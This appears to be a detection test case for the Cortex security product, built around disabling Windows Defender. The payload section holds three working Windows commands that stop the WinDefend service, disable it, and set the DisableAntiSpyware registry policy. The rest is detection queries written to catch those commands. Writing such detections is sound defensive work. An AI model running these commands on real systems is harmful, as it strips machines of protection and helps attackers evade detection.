identity.summary: An attacker disables Windows security services such as Windows Defender or Security Center to evade detection and maintain persistence. Cortex should detect the execution of commands that disable thes
identity.description: An attacker disables Windows security services such as Windows Defender or Security Center to evade detection and maintain persistence. Cortex should detect the execution of commands that disable these services.

techniques.name: Impair Defenses: Disable or Modify Tools

payload.code:
sc config WinDefend start= disabled
sc stop WinDefend
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

expected_artifacts.description: Execution of sc.exe with config and stop arguments
expected_artifacts.expected_value: action_process_image_name = 'sc.exe' and action_file_path contains 'config' and action_file_path contains 'stop'

expected_artifacts.description: Execution of reg.exe to modify registry keys
expected_artifacts.expected_value: action_process_image_name = 'reg.exe' and action_file_path contains 'add' and action_file_path contains 'DisableAntiSpyware'

biocs.name: Service Disabled via Sc Command
biocs.description: Detection of service disablement using the sc.exe utility
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'sc.exe' and action_file_path contains 'config' and action_file_path contains 'start= disabled'
